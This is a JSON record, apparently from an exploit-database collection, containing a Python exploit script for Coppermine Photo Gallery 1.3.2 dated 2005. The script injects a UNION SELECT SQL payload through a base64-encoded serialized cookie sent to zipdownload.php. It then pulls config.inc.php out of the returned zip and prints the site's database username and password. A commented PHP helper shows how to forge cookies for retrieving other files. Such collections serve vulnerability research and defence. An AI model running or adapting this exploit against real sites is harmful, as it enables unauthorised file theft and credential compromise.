{
  "id": "1317",
  "title": "Coppermine Photo Gallery 1.3.2 - File Retrieval / SQL Injection",
  "cve": null,
  "vuln_type": "sqli",
  "code": "# tested and approved /str0ke\r\n\r\n#CPG Exploit\r\n#File Retrieval by SQL Injection.\r\n#By Default this exploit get the config.inc.php file which\r\n#contains the db user/pass\r\n#If you want to get another file you need to have the good cookie\r\n#you can use this phpscript to get good cookie :\r\n##<?\r\n##$tab[]=$_GET['inj'];\r\n##$val=base64_encode(serialize($tab));\r\n##echo $val;\r\n##?>\r\n#\r\n#By DiGiTAL_MiDWAY\r\n\r\n\r\nimport urllib2, sys\r\nfrom urllib import urlencode\r\nimport zipfile\r\n\r\nif(len(sys.argv)<2):\r\n    print 'usage : %s http://host/Path/ tableprefix[default : cpg132_ for v1.3.1 use cpg1d_]' % sys.argv[0]\r\n    sys.exit(0)\r\nsite=sys.argv[1]\r\ntry:\r\n    prefix=sys.argv[2]\r\nexcept:\r\n    prefix='cpg132_'\r\n\r\nprint '''File Retrieval by SQL Injection for Coppermine Photo Gallery v<=1.3.2\r\n                   by DiGiTAL_MiDWAY [digital.midway@gmail.com]'''\r\n\r\ncook='YToxOntpOjA7czo1MToiJycpIFVOSU9OIFNFTEVDVCAnLi4vaW5jbHVkZS8nLCAnY29uZmlnLmluYy5waHAnIC8qIjt9'\r\n# '') UNION SELECT filepath,file /*\r\n\r\nreq=urllib2.Request(site+'zipdownload.php')\r\nreq.add_header('Cookie', urlencode({prefix+'fav' : cook}))\r\n\r\nzip=open('test.zip', 'wb')\r\nprint '[+]Opening WebPage'\r\ntry:\r\n    f=urllib2.urlopen(req).read()\r\nexcept:\r\n    print '[+]Failed to opening website', sys.exc_info()\r\n    sys.exit(0)\r\nzip.write(f)\r\nzip.close()\r\nmonzip=zipfile.ZipFile('test.zip', 'r')\r\ntry:\r\n    conf=monzip.read('config.inc.php')\r\nexcept:\r\n    print '[+]Exploit failed....'\r\n    sys.exit(0)\r\nmonzip.close()\r\nconf=conf[conf.find(\"$CONFIG['dbuser'] =\")+len(\"$CONFIG['dbuser'] =\"):]\r\nconf=conf[conf.find(\"'\")+1:]\r\nuser=conf[:conf.find(\"'\")]\r\nconf=conf[conf.find(\"$CONFIG['dbpass'] =\")+len(\"$CONFIG['dbpass'] =\"):]\r\nconf=conf[conf.find(\"'\")+1:]\r\npasswd=conf[:conf.find(\"'\")]\r\nprint '[+]Exploit Succeed'\r\nprint '[+]User :', user, 'Pass :', passwd\r\n\r\n# milw0rm.com [2005-11-13]",
  "url": "https://www.exploit-db.com/exploits/1317"
}